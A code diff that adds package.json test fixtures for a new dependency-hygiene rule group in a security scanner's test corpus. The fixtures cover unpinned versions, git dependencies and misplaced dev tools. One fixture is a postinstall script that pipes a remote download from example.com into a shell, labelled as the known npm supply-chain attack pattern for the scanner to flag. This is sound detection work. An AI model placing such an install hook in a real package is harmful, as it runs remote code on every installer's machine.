@@ -228,6 +228,26 @@ const CORPUS = [
     { id: "auth-bcrypt-compare-used", group: "auth", bucket: "safe", forbidSeverity: "medium", note: "real bcrypt.compare() usage — a CallExpression, not a === comparison — must NOT flag",
       code: `async function login(password, storedHash) {\n  return bcrypt.compare(password, storedHash);\n}\n` },
 
+    // ===================== Dependency hygiene (new rule group) =====================
+    { id: "dep-hygiene-unpinned-wildcard", group: "dependency-hygiene", bucket: "vulnerable", mode: "package-json", expectRuleIds: ["dep-unpinned-version"], expectSeverity: "high", note: "a wildcard version accepts literally any published release",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "express": "*"\n  }\n}\n` },
+    { id: "dep-hygiene-unpinned-latest", group: "dependency-hygiene", bucket: "vulnerable", mode: "package-json", expectRuleIds: ["dep-unpinned-version"], expectSeverity: "high", note: "'latest' is the same unpinned-version problem under a different spelling",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "left-pad": "latest"\n  }\n}\n` },
+    { id: "dep-hygiene-git-dependency", group: "dependency-hygiene", bucket: "vulnerable", mode: "package-json", expectRuleIds: ["dep-non-registry-source"], expectSeverity: "medium", note: "a git-URL dependency bypasses registry-level integrity checks and can change without a version bump",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "some-fork": "git+https://github.com/someuser/some-fork.git"\n  }\n}\n` },
+    { id: "dep-hygiene-suspicious-postinstall", group: "dependency-hygiene", bucket: "vulnerable", mode: "package-json", expectRuleIds: ["dep-suspicious-script-content"], expectSeverity: "critical", note: "a postinstall script piping a remote download into a shell — the real, well-known npm supply-chain-attack pattern",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "scripts": {\n    "postinstall": "curl http://example.com/payload.sh | sh"\n  }\n}\n` },
+    { id: "dep-hygiene-devtool-in-dependencies", group: "dependency-hygiene", bucket: "vulnerable", mode: "package-json", expectRuleIds: ["dep-devtool-in-dependencies"], expectSeverity: "low", note: "eslint (a dev-only tool) declared in \"dependencies\" instead of \"devDependencies\"",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "eslint": "^9.0.0"\n  }\n}\n` },
+    { id: "dep-hygiene-properly-pinned-safe", group: "dependency-hygiene", bucket: "safe", mode: "package-json", forbidSeverity: "medium", note: "a normal, properly pinned registry dependency must NOT flag any check",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "dependencies": {\n    "lodash": "^4.17.21"\n  }\n}\n` },
+    { id: "dep-hygiene-devtool-correctly-placed-safe", group: "dependency-hygiene", bucket: "safe", mode: "package-json", forbidSeverity: "medium", note: "a dev tool correctly placed in devDependencies must NOT be flagged as misplaced — the check only looks at the \"dependencies\" block",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "devDependencies": {\n    "vitest": "^3.0.0"\n  }\n}\n` },
+    { id: "dep-hygiene-ordinary-postinstall-not-suspicious", group: "dependency-hygiene", bucket: "edge-cases", mode: "package-json", expectRuleIds: ["dep-lifecycle-script-present"], expectSeverity: "info", forbidSeverity: "critical", note: "an ordinary postinstall script (running a local, versioned tool) is informational only, not a suspicious-pattern match — demonstrates the two lifecycle-script checks are properly distinct, not the same finding at two severities",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "scripts": {\n    "postinstall": "husky install"\n  }\n}\n` },
+    { id: "dep-hygiene-no-dependencies-at-all-safe", group: "dependency-hygiene", bucket: "safe", mode: "package-json", forbidSeverity: "info", note: "a package.json with no dependencies/devDependencies/scripts at all must produce zero findings of any severity",
+      code: `{\n  "name": "example-app",\n  "version": "1.0.0",\n  "description": "just a name and a version"\n}\n` },
+
     // ===================== General safe examples, no high/critical at all (5) =====================
     { id: "safe-plain-component", group: "general-safe", bucket: "safe", forbidSeverity: "medium", note: "ordinary, unremarkable React component",
       code: `export default function Card({ title, description }) {\n  return (\n    <section>\n      <h2>{title}</h2>\n      <p>{description}</p>\n    </section>\n  );\n}\n` },
@@ -257,6 +277,7 @@ for (const c of CORPUS) {
         expectSeverity: c.expectSeverity || null,
         forbidSeverity: c.forbidSeverity || null,
         note: c.note,
+        ...(c.mode ? { mode: c.mode } : {}),
     };
 }
 
